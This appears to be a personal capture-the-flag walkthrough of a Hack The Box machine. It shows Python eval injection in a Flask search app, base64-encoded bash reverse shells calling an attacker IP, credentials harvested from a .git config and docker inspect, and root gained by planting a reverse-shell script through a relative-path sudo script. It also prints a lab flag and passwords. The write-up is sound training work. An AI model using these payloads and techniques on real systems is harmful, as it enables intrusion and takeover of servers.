```
sudo nmap -sC -sV -oN nmap 
```

![[Pasted image 20250416205710.png]]
- add searcher.htb to /etc/hosts

Website

![[Pasted image 20250416205936.png]]

Two search boxes and a checked box.

![[Pasted image 20250416210054.png]]
- Search engine selection and then keyword

Site version info
![[Pasted image 20250416210129.png]]
- Searchor 2.4.0
- Flask

Fuzzing with IppSec.

Send search engine search to Burpsuite and send to Repeater

![[Pasted image 20250418203618.png]]

Right click within request window and select "Copy to file" and save as search.req

![[Pasted image 20250418203731.png]]

Open search.req to add the FUZZ parameter
![[Pasted image 20250418204107.png]]

Use #ffuf with `-request` and `-request-proto` flags

```
ffuf -request search.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
```

Lots of different sizes

![[Pasted image 20250418204439.png]]

Determining meanings of the size using Burp
![[Pasted image 20250418204607.png]]

< : Size 41

The interesting size is ✨0✨

This is Python (Flask) server.

Google "[Cobalt SSTI](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)"

Use this string of special characters when testing SSTI

```
${{<%[%'"}}%\.
```

Paste this payload into Burp repeater request. 

![[Pasted image 20250418210124.png]]
- 200 Okay, so not an SSTI

Rerun ffuf and match size for 0 (`-ms 0`)

```
ffuf -request search.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -ms 0
```

Result

![[Pasted image 20250418210443.png]]
- '
- \

Back to Burp and put in a backslash 

![[Pasted image 20250418210609.png]]
- Nothing

Put in single quote
![[Pasted image 20250418210653.png]]
- Nada

Let's do SQL injection check 

Payload: '  --+-

![[Pasted image 20250418210828.png]]
- also nothing

Trying another payload: # (but urlencoded to %20%23%20) 

![[Pasted image 20250418211059.png]]

Thinking about python and formatting like print('hey')

Let's add a ')

![[Pasted image 20250418211232.png]]

The query worked

![[Pasted image 20250418211354.png]]

Hypothesizing that we're in an "eval" statement

New payload to test for string concatenation

![[Pasted image 20250418211514.png]]

Query gone
![[Pasted image 20250418211559.png]]

Re-running query but url encoding '+' to %2b

![[Pasted image 20250418211655.png]]

We got our query back and the string concatenation worked

![[Pasted image 20250418211759.png]]

We found code execution.

Try 'print' as well

![[Pasted image 20250418211855.png]]

Just prints out 'ya' 

![[Pasted image 20250418211957.png]]

At this point, try to import os and run commands

![[Pasted image 20250418212057.png]]

This worked

![[Pasted image 20250418212210.png]]
- Successfully executed 'id' command

Let's do a reverse shell. 

```
echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'" |base64
```

We want to get rid of this special character 

![[Pasted image 20250418212624.png]]

Just add an additional space between -i and >&

![[Pasted image 20250418212732.png]]
- Now there's another one..?
- Add another space between 9001 and 0>

![[Pasted image 20250418212845.png]]
- now add two more spaces after the 1' and before the "|base64 to get rid of the ==

![[Pasted image 20250418213010.png]]

Now we have a standard string. 

Start nc listener 

```
nc -nvlp 4444
```

Then testing payload locally

```
echo -n YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi85MDAxICAwPiYxJyAg | base64 -d | bash
```

![[Pasted image 20250418213304.png]]

Got connection 

![[Pasted image 20250418213327.png]]

Now paste the string into burp request

![[Pasted image 20250418213442.png]]

![[Pasted image 20250418213725.png]]
Got a reverse shell 

![[Pasted image 20250418213759.png]]
flag ? 

```
84f4abba0ca6d2e4db7b1ac0e2fe66e2
```

Notice .gitconfig and there's an email and name in here

![[Pasted image 20250418214031.png]]
- cody@searcher[.]htb

There's also a .git folder in `/var/www/app`

![[Pasted image 20250418214756.png]]

- run `git log` but got an error 


Run 
```
ss -lntp
```

![[Pasted image 20250418215000.png]]
- Two applications 
- One on port 5000 (web server bc of the python stuff)
- One on port 3000
- Mysql on 3306?

Navigate to `/etc/apache2/sites-enabled` to see what is using mysql

![[Pasted image 20250418215552.png]]

- server admin: `admin@searcher.htb`
- gitea instance on port 3000

Add gitea.searcher.htb to our kali's /etc/hosts

![[Pasted image 20250418215851.png]]

Here's the site login to gitea, but we don't have creds.

![[Pasted image 20250418220200.png]]

Enumerate box for creds.

There is only one commit in git log. 

![[Pasted image 20250418220430.png]]
Maybe there's a password in the `.git` folder

Yeah there's cody's password in the `config` file in the `.git` directory.

![[Pasted image 20250418220713.png]]
`cody:jh1usoih2bkjaspwe92`

These creds worked and I logged in to gitea

![[Pasted image 20250418220845.png]]

There's an administrator user 

![[Pasted image 20250418221133.png]]
- administrator[@]gitea.searcher[.]htb

Try to sign in as administrator with cody's password, but that didn't wurk.

Now trying cody's password on our svc user..

Need to spawn TTY shell to run `sudo -l`

Used this article https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell

Then run `sudo -l` and use cody's pass

![[Pasted image 20250418221815.png]]
We can run sudo on `/opt/scripts/system-checkup.py`

```
/usr/bin/python3 /opt/scripts/system-checkup.py
```

But we aren't allowed to execute it 

![[Pasted image 20250418222049.png]]
Actually the script needs an argument.

![[Pasted image 20250418222352.png]]

Provide docker-ps as arg

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

![[Pasted image 20250418222309.png]]

Provide docker-inspect and the format and container name

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} 9608
```

![[Pasted image 20250418222630.png]]

Reformat as JSON so it's easier to read

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 9608
```

![[Pasted image 20250418222835.png]]
- Got gitea database creds `gitea:yuiu1hoiu4i5ho1uh`

Now we can login to mysql?

But trying to login to gitea as administrator with this password instead.

It worked!

![[Pasted image 20250418223134.png]]

There's a scripts repo and we can see source code. 

Viewing system-checkup.py 

![[Pasted image 20250418223305.png]]
- We want to find some code execution vulnerability here
- Notice that `./full-checkup.sh` is being executed, but full path isn't provided
	- If we execute this script in a directory that we have write access to, it should execute full-checkup
![[Pasted image 20250418230006.png]]
cd to `/dev/shm`

Create a file called `full-checkup.sh`

Put this reverse shell 

```
#!/bin/bash

bash -c 'bash -i &> /dev/tcp/10.10.14.6/9002 0>&1'

```

![[Pasted image 20250418231656.png]]

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Got root.

![[Pasted image 20250418232428.png]]
